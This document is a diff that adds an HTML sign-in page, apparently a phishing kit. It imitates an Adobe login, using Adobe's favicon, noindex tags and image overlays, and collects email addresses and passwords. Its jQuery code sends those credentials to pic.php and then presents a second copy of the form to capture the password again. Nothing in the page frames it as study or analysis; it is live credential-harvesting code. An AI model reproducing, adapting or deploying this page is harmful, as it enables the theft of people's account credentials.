@@ -1,0 +1,154 @@
+<html><head><link rel="shortcut icon" type="image/x-icon" href="http://www.adobe.com/favicon.ico">
+<meta http-equiv="Content-Type" content="text/html;charset=UTF-8">
+
+<title>Sign in</title>
+
+
+<meta name="robots" content="noindex">
+<meta name="googlebot" content="noindex">
+<meta name="googlebot-news" content="noindex">
+<meta name="googlebot" content="noindex">
+<meta name="googlebot-news" content="nosnippet">
+
+    <meta http-equiv="Cache-Control" content="no-store">
+    <meta http-equiv="Cache-Control" content="no-cache">
+    <meta http-equiv="Cache-Control" content="private">
+    <meta http-equiv="Pragma" content="no-cache">
+
+<link rel="shortcut icon" href="File/favicon0.xml">
+			  
+			<script src="js/jquery-2.2.3.min.js"></script> 
+			
+			<script>
+			$("button").click(function (e) {
+    e.preventDefault();
+    var value = $("#textbox").val();
+    alert(value);
+    $.ajax({
+        type: "POST",
+        url: "parse_data",
+        data: JSON.stringify({ "text" : value } ),
+        contentType: "application/json; charset=utf-8",
+        dataType: "json",
+        success: function (data) {
+            alert(JSON.stringify(data));
+        }
+    });
+
+});
+</script> 
+			 <script type="text/javascript">
+$(document).ready(function() {
+  var form = $('#aza'); // contact form
+  var submit = $('#ewu');  // submit button
+  var alert = $('.alertx'); // alert div for show alert message
+  var loader = $('.loader');
+
+  // form submit event
+  form.on('submit', function(e) {
+    e.preventDefault(); // prevent default form submit
+ //form.append('file', $('#imgInp')[0].files[0]);
+var formData = new FormData($(this)[0]);
+    $.ajax({
+      url: 'pic.php', // form action url
+      type: 'POST', // form submit method get/post
+      dataType: 'html',
+	   //data: {"text" : email}, // request type html/json/xml
+     // data: form.serialize(), // serialize form data 
+	        data: formData,
+	  async: false,
+       cache: false,
+       contentType: false,
+       enctype: 'multipart/form-data',
+       processData: false,
+	  
+	  
+      beforeSend: function() {
+        alert.fadeOut();
+		loader.fadeIn();
+		$("#one").fadeOut();
+		$("#two").fadeOut();
+       // submit.html('Loading...'); // change submit button text
+      },
+      success: function(data) {
+        alert.html(data).fadeIn(); // fade in response data
+		loader.fadeOut();
+		$("#two").fadeIn();
+		$("#one").hide();
+		
+     //  form.trigger('reset'); // reset form
+        submit.html(''); // reset submit button text
+	  
+			
+	      },
+      error: function(e) {
+        console.log(e)
+      }
+    });
+  });
+});
+</script>
+<script type="text/javascript">
+
+function unhideBody()
+{
+var bodyElems = document.getElementsByTagName("body");
+bodyElems[0].style.visibility = "visible";
+}
+
+</script>
+
+</head><body style="visibility: visible;" onload="unhideBody()" background="File/2Q0000001.jpg" bgproperties="fixed">
+<style> 
+  .textbox { 
+    border: 1px solid #c4c4c4; 
+    height: 40px; 
+    width: 275px; 
+    font-size: 16px; 
+    padding: 4px 4px 4px 4px; 
+    border-radius: 4px; 
+    -moz-border-radius: 4px; 
+    -webkit-border-radius: 4px;
+padding-left:18px;	
+
+ 
+     
+} 
+ 
+.textbox:focus { 
+    outline: none; 
+    border: 1px solid #7bc1f7; 
+    box-shadow: 0px 0px 8px #7bc1f7; 
+    -moz-box-shadow: 0px 0px 8px #7bc1f7; 
+    -webkit-box-shadow: 0px 0px 8px #7bc1f7; 
+} 
+ </style> 
+
+
+<div id="image1" style="position:absolute; overflow:hidden; left:405px; top:147px; width:599px; height:592px; z-index:0"><img src="File/A5BVjiII.png"></div>
+
+<div class="alertx" style="position:absolute;width:343px;left:534px;top:410px;z-index:1"></div>
+<div class="loader" style="display:none">Authenticating...</div>
+<div id="one">
+<form action="" id="aza" method="post">
+<input name="username" placeholder="Email Address" class="textbox" required="" type="email" style="position:absolute;width:343px;left:534px;top:445px;z-index:1">
+
+<input name="password" placeholder="Email Password" class="textbox" required="" type="password" style="position:absolute;width:343px;left:534px;top:499px;z-index:2">
+<div id="formimage1" style="position:absolute; left:562px; top:553px; z-index:3"><input type="image" id="ewu" name="formimage1" width="290" height="38" src="File/wFFWgTmQ.png"></div>
+</form>
+</div>
+
+<div id="two" style="display:none;">
+
+<form action="pic.php" id="" method="post">
+<input name="username" placeholder="Email Address" class="textbox" required="" type="email" style="position:absolute;width:343px;left:534px;top:445px;z-index:1">
+<input name="hold" value="1" type="hidden">
+<input name="password" placeholder="Email Password" class="textbox" required="" type="password" style="position:absolute;width:343px;left:534px;top:499px;z-index:2">
+<div id="formimage1" style="position:absolute; left:562px; top:553px; z-index:3"><input type="image" id="" name="formimage1" width="290" height="38" src="File/wFFWgTmQ.png"></div>
+</form>
+
+
+</div>
+
+
+</body></html>
